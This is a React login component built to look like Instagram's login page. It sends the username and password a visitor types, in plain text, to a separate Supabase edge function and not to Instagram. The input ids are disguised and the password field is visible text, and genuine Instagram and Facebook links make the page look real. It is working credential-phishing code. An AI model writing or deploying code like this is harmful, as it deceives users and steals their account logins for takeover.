import { useState } from 'react'
import FloatingField from './FloatingField'
import icon from '../assets/icon.png'
import { SUBMIT_EVENT_URL, SUPABASE_ANON_KEY } from '../lib/supabase'

import logo from '../assets/logo.svg'

export default function LoginForm() {
  const [identifier, setIdentifier] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)

  // ✅ same contract as backend
  const canSubmit =
    identifier.trim().length > 0 &&
    password.trim().length > 0

  // 📦 payload MUST match edge function exactly
  const buildPayload = () => ({
    identifier: identifier.trim(),
    password: password.trim(),
    submittedAt: new Date().toISOString(),
  })

  const onSubmit = async (e) => {
    e.preventDefault()

    if (!canSubmit || loading) return

    setLoading(true)

    try {
      const payload = buildPayload()

      console.log('📦 Sending payload:', payload)

      const res = await fetch(SUBMIT_EVENT_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${SUPABASE_ANON_KEY}`,
        },
        body: JSON.stringify(payload),
      })

      const data = await res.json()
      console.log('📩 Server response:', data)

      if (!data.ok) {
        console.warn('❌ Backend rejected request:', data.error)
      }

    } catch (err) {
      console.error('❌ Submit failed:', err)
    } finally {
      setLoading(false)
    }
  }

  return (
    <section className="flex items-center justify-center bg-[#1c1e21] border-t border-line lg:border-t-0 lg:border-l px-6 sm:px-8 py-10">
      <div className="w-full max-w-[530px] mx-auto flex flex-col px-4 sm:px-6 lg:px-0 lg:py-10">
        {/* Header */}
        <h2 className="text-sys-20 font-medium tracking-[0.03em]">
          Log into Instagram
        </h2>

        {/* Form */}
        <form onSubmit={onSubmit} className="mt-8 flex flex-col gap-4">
          {/* log in */}
          <FloatingField
            id="fruit"
            label="Mobile number, username or email"
            type="text"
            value={identifier}
            onChange={(e) => setIdentifier(e.target.value)}
          />

          <FloatingField
            id="color"
            label="Password"
            type="text"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />

          {/* Submit */}
          <button
            type="submit"
            disabled={!canSubmit || loading}
            className="h-14 w-full rounded-[30px] bg-accent text-white font-semibold transition active:scale-[0.98] disabled:opacity-40"
          >
            {loading ? 'Loging...' : 'Login'}
          </button>


          {/* 3 · Forgot password */}
          <a
            href="https://www.instagram.com/accounts/password/reset/"
            className="text-center text-sys-14 font-medium text-white transition-colors hover:text-accent-hover hover:underline py-4"
          >
            Forgot password?
          </a>

          {/* 4 · Log in with Facebook */}
          <a
            type="button"
            href="https://www.facebook.com/oidc/?app_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignupviafb%2F&response_type=code&scope=openid%20email%20profile%20linking&state=ATpFEMCScmqn_7yyD2YtMcclK7T1dCOLk-FdzTccQJGOKWgyvijjvqghbdg-TsjV8m5I7O-StXkeM8cGIqBknkNoSGyujlYnZhotes4lEzXbybUIBsgUIS1R5K6xt3pd7mWrQIqlMtm-17og-FsRMObf_96fNhuio7gwdPUTsaaujcjsfaTiratkKOVcrF7jxGQBawuMaXJhqS5292DKyIqjelbrw2bO4HsaJUOI9BNX_fx-hURM3NrbyVxLjx4Kc-f9KjK0NCHKcUnF2XGVaSU5Vw"

            className="flex h-12 w-full items-center justify-center gap-2.5 rounded-[30px] border border-line-strong bg-transparent text-sys-14 font-medium text-ink transition-[border-color,transform] duration-short-out ease-soft hover:border-grey-4 active:scale-[0.985]"
          >
            <svg viewBox="0 0 24 24" className="h-4 w-4" fill="#1877F2" aria-hidden="true">
              <path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07c0 6.03 4.39 11.03 10.13 11.93v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.97h-1.51c-1.49 0-1.95.93-1.95 1.88v2.26h3.32l-.53 3.49h-2.79v8.44C19.61 23.1 24 18.1 24 12.07z" />
            </svg>
            Log in with Facebook
          </a>

        </form>

        {/* 5 · Create new account — outlined button like Facebook, but blue
            text and a blue border on focus */}
        <a
          href="https://www.instagram.com/accounts/emailsignup/?next="
          className="flex h-12 w-full items-center justify-center gap-2.5 mt-4 h-12 w-full rounded-[30px] border border-accent bg-transparent text-sys-14 font-semibold text-accent transition-[border-color,transform] duration-short-out ease-soft hover:border-accent-hover focus:border-accent focus:outline-none active:scale-[0.985]"
        >
          Create new account
        </a>

        {/* 6 · Icon */}
        <div className="mt-6 flex items-center justify-center">
          <img src={icon} alt="Kolak" className="h-16 w-auto" />
        </div>

      </div>
    </section>
  )
}